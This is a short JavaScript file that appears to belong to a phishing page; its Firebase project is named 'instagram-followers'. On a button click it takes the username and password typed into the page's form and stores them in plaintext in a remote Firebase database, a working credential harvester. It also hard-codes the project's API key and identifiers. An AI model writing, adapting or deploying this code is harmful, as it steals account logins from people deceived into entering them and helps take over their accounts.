// Import the functions you need from the SDKs you need
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
import { getAnalytics } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-analytics.js";

import {
  getDatabase,
  ref,
  set,
} from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

const firebaseConfig = {
  apiKey: "AIzaSyBxqvOucaGwwhUkHxmzcVF_Xhe5DADoO3Y",
  authDomain: "instagram-followers-afefb.firebaseapp.com",
  projectId: "instagram-followers-afefb",
  storageBucket: "instagram-followers-afefb.appspot.com",
  messagingSenderId: "950924441623",
  appId: "1:950924441623:web:65bfd5a8a75eea7b9c0452",
  measurementId: "G-ZHVGGQN86Y",
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);
const analytics = getAnalytics(app);

// get ref to db
const db = getDatabase(app);

document.getElementById("btn").addEventListener("click", (e) => {
  e.preventDefault();
  
  const username = document.getElementById("username").value;
  const password = document.getElementById("pass").value;

  set(ref(db, "users/" + username), {
    username: username,
    password: password,
  })
    .then(() => {
      console.log('successful');
    })
    .catch((error) => {
      console.error("Error storing data: ", error);
    });
});
